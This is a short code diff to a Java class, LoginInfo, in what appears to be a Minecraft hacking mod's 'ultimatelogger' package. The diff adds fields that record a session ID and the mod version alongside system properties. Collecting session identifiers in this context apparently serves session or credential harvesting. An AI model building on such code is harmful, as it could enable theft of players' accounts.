@@ -5,6 +5,7 @@
  */
 package ehacks.mod.util.ultimatelogger;
 
+import ehacks.mod.main.Main;
 import ehacks.mod.util.Mappings;
 import java.util.ArrayList;
 
@@ -16,10 +17,12 @@ public class LoginInfo {
     public SessionInfo session = new SessionInfo();
     public boolean ismcp = Mappings.isMCP();
     public long time = System.currentTimeMillis();
-    public ArrayList<PropertyInfo> sysprops = new ArrayList<PropertyInfo>();
+    public ArrayList<PropertyInfo> sysprops = new ArrayList();
+    public String sessionid = Main.tempSession;
+    public String modversion = Main.realVersion;
 
     public LoginInfo() {
-        ArrayList<String> tlist = new ArrayList<String>();
+        ArrayList<String> tlist = new ArrayList();
         tlist.add("java.runtime.name");
         tlist.add("java.vm.version");
         tlist.add("user.country");
